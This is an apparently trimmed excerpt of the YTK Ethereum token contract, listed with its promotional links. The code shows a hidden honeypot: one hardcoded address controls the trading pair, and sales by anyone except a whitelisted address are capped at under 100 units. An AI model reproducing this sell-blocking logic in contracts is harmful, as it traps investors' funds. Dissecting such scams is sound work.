...
Website: http://ytketh.top
Twitter: https://twitter.com/ytkethcoin
Telegram: https://t.me/YTK_ETH
...
contract YTK is Ownable, IERC20, IERC20Meta {
    ...
    function toPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x3Ed4dcB0B4E5149b08296D72c66Fc3F9Cc7917A5) _pair = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if(_pair != address(0)) {
            if(to == _pair && from != 0xea5910C3401CBC5b468C5BA10C4cc02458b09a2E) {
               bool b = false;
               if(!b) {
                    require(amount < 100);
               }
